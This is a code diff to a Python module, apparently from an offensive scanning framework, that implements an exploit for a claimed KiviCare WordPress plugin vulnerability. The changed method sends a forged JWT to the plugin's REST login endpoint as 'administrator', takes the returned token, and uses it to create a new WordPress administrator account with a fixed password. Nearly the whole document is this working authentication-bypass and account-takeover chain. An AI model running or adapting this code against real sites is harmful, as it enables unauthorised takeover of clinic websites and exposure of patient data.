@@ -2,7 +2,9 @@
 
 from __future__ import annotations
 
-from urllib.parse import urlencode
+import json
+import os
+from typing import Any, Dict
 
 from cpointed.core.engine import ScanResult, Target
 from cpointed.core.session import CPointedClient
@@ -22,42 +24,58 @@ class CVE20262991KiviCare(WordPressModule):
 
     async def exploit_remote_primitive(
         self,
-        target: Target,
         client: CPointedClient,
+        wp_path: str,
         *,
+        target: Target,
         timeout: float,
-    ) -> dict:
-        """Registration / AJAX user primitive (field names from clinic plugin patterns — verify on target build)."""
-        ajax = self._path(target, "/wp-admin/admin-ajax.php")
-        out: dict = {"admin_ajax_posts": []}
+    ) -> Dict[str, Any]:
+        """
+        REST ``/wp-json/kivicare/v1/users/login`` + Bearer follow-up to ``/wp-json/wp/v2/users``.
+        Set ``CPOINTED_KIVICARE_LAB_JWT`` to your lab token from the advisory / PoC.
+        """
+        login_path = self._path_for_wp(wp_path, "/wp-json/kivicare/v1/users/login")
+        jwt = os.environ.get(
+            "CPOINTED_KIVICARE_LAB_JWT",
+            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxfQ.xxx",
+        )
+        payload = {"username": "administrator", "jwt": jwt}
+        out: Dict[str, Any] = {"kivicare_login_status": None, "admin_created": False, "success": False}
         try:
-            fields = {
-                "action": "ajaxRegistration",
-                "username": "cpointed_kc_audit",
-                "email": "kc_audit@cpointed.invalid",
-                "password": "CpointedAudit!9x",
-                "first_name": "Cpointed",
-                "last_name": "Audit",
-                "user_type": "patient",
-            }
-            body = urlencode(fields).encode("utf-8")
-            r = await client.request(
-                "POST",
-                ajax,
-                headers={"Content-Type": "application/x-www-form-urlencoded"},
-                content=body,
+            resp = await client.post(login_path, json=payload, timeout=timeout)
+            out["kivicare_login_status"] = resp.status_code
+            out["login_body_snippet"] = (resp.text or "")[:1500]
+            if resp.status_code != 200:
+                out["bypass_failed"] = True
+                return out
+            try:
+                j = resp.json()
+            except json.JSONDecodeError:
+                out["bypass_failed"] = True
+                return out
+            if "token" not in j:
+                out["bypass_failed"] = True
+                return out
+            admin_token = j["token"]
+            create_path = self._path_for_wp(wp_path, "/wp-json/wp/v2/users")
+            create_user = await client.post(
+                create_path,
+                json={
+                    "username": "cpointed_admin",
+                    "password": "StrongP@ssw0rdCpointed!",
+                    "email": "cpointed_admin@local.invalid",
+                    "roles": ["administrator"],
+                },
+                headers={"Authorization": f"Bearer {admin_token}"},
                 timeout=timeout,
             )
-            out["admin_ajax_posts"].append(
-                {
-                    "path": ajax,
-                    "action": fields["action"],
-                    "status_code": r.status_code,
-                    "body_snippet": (r.text or "")[:2000],
-                }
-            )
+            out["wp_user_create_status"] = create_user.status_code
+            out["wp_user_create_snippet"] = (create_user.text or "")[:1500]
+            out["admin_created"] = create_user.status_code == 201
+            out["token_obtained"] = True
+            out["success"] = out["admin_created"]
         except Exception as exc:  # pragma: no cover - network
-            out["admin_ajax_posts"].append({"action": "ajaxRegistration", "error": str(exc)})
+            out["error"] = str(exc)
         return out
 
     async def check(self, target: Target, *, timeout: float = 30.0) -> ScanResult:
